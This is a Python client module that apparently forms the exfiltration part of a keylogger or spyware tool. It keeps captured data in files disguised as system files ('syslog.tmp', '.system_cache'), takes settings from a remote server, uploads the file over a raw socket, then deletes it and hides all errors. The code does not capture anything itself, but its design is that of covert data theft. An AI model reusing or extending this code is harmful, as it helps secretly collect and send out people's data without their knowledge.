"""
Client Module - Handles server communication and log transmission
"""

import os
import socket
import platform
import json

SERVER_IP = "localhost" 
SERVER_PORT = 9999

CONFIG = {
    'send_interval': 10,
    'buffer_size': 1024,
    'retry_attempts': 3
}

# OS-specific log file location
if platform.system() == "Windows":
    log_file = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'syslog.tmp')
else:
    log_file = os.path.join(os.path.expanduser("~"), ".system_cache")

def get_config_from_server():
    """Request configuration from server"""
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((SERVER_IP, SERVER_PORT))
        # Send config request identifier
        s.send(b'C')
        config_data = s.recv(1024).decode('utf-8')
        s.close()
        # Update local config with server settings
        server_config = json.loads(config_data)
        CONFIG.update(server_config)
        return True
    except:
        return False

def send_logs():
    """Send log file to server and delete after successful transmission"""
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((SERVER_IP, SERVER_PORT))
        # Send log upload identifier
        s.send(b'L')
        
        if not os.path.exists(log_file):
            s.close()
            return False
        
        # Send file in chunks
        with open(log_file, "rb") as f:
            while True:
                data = f.read(CONFIG['buffer_size'])
                if not data:
                    break
                s.send(data)
        
        s.close()
        
        # Delete log file after successful send
        try:
            os.remove(log_file)
        except:
            pass
        
        return True
    except:
        return False

def get_log_file():
    """Return the log file path"""
    return log_file

def get_send_interval():
    """Return the current send interval"""
    return CONFIG['send_interval']